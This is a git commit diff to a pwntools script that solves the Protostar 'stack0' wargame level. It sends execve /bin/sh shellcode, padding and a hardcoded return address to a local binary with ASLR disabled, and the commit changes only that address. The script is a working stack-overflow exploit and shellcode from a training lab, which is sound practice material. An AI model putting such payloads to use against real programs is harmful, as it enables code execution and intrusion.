9370f47c7ebf18d9db2aee505d8931edf4b11b0c
Đào Trọng Nghĩa <nghiadtse05330@fpt.edu.vn>
2018-03-02 03:07:47 +0700

    Update stack0-2.py

--- 2018/protostar/stack0/stack0-2.py
+++ 2018/protostar/stack0/stack0-2.py
@@ -5,7 +5,7 @@ shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1
 
 r=process("./stack0",aslr=False)
 print 'Pwned'
-r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd04C))
+r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd01C))
 
 
 
